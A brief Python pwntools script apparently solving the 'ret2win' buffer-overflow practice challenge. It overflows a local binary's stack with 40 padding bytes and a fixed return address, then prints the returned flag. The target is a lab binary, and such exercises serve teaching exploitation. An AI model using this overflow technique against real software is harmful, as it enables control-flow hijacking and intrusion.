from pwn import *


payload = 'A'*40+p64(0x400812)
p = process('./ret2win')
print p.recvuntil('>')
p.sendline(payload)
print p.recvuntil('}')
